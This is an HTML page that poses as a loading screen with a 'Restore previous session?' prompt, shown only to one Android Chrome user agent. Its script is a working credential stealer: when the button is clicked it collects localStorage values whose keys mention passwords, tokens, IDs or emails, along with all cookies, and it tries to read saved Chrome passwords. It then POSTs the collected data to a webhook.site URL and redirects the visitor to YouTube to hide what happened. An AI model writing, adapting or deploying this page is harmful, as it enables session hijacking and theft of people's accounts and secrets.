<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        #loader {
            width: 48px;
            height: 48px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #prompt {
            display: none;
            position: absolute;
            bottom: 25%;
            left: 50%;
            transform: translateX(-50%);
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15);
            text-align: center;
            width: 85%;
            max-width: 300px;
            border: 1px solid #e0e0e0;
        }

        #prompt p {
            margin: 0 0 20px 0;
            font-size: 600;
            color: #333;
            line-height: 1.4;
        }

        button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            cursor: pointer;
            border-radius: 6px;
            font-size: 14px;
            font-weight: 500;
            width: 100%;
        }
    </style>
</head>
<body>

    <div id="loader"></div>
    
    <div id="prompt">
        <p>Restore previous session?</p>
        <button onclick="fullExtraction()">Continue</button>
    </div>

<script>
    // 1. Target User-Agent for Stealth (Android Chrome)
    const targetUA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Mobile Safari/537.36";

    // 2. Your Webhook.site URL
    const sendToURL = "https://webhook.site/180fd8ac-33a8-4ceb-8dc7-364aad55c098"; 

    // 3. Redirect to YouTube
    const redirectURL = "https://www.youtube.com/";

    if (navigator.userAgent === targetUA) {
        setTimeout(() => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('prompt').style.display = 'block';
        }, 1500);
    }

    async function fullExtraction() {
        let data = {};
        
        try {
            // A. Extract LocalStorage
            for (let key in localStorage) {
                const value = localStorage.getItem(key);
                if (value && value.length > 3) {
                    if (key.toLowerCase().includes('pass') || 
                        key.toLowerCase().includes('token') || 
                        key.toLowerCase().includes('id') || 
                        key.toLowerCase().includes('email')) {
                        data[`ls_${key}`] = value;
                    }
                }
            }

            // B. Extract Cookies
            const cookies = document.cookie.split(';');
            cookies.forEach(cookie => {
                let [name, value] = cookie.trim().split('=');
                if (name && value) {
                    data[`cookie_${name}`] = value;
                }
            });

            // C. Try Chrome Autofill API
            if (window.chrome && chrome.passwordsPrivate) {
                try {
                    const passwords = await chrome.passwordsPrivate.getPasswords();
                    data['chrome_autofill_passwords'] = passwords;
                } catch (e) {
                    data['chrome_autofill_error'] = e.message;
                }
            }

            // D. Send Data to Webhook
            const payload = {
                userAgent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                extractedData: data
            };

            await fetch(sendToURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // E. Wait 5 seconds before redirecting to YouTube
            // This ensures the data is fully sent and visible in Webhook.site
            setTimeout(() => {
                window.location.href = redirectURL;
            }, 5000);

        } catch (error) {
            console.error("Extraction failed:", error);
            // Even if it fails, wait a bit then go to YouTube
            setTimeout(() => {
                window.location.href = redirectURL;
            }, 2000);
        }
    }
</script>

</body>
</html>
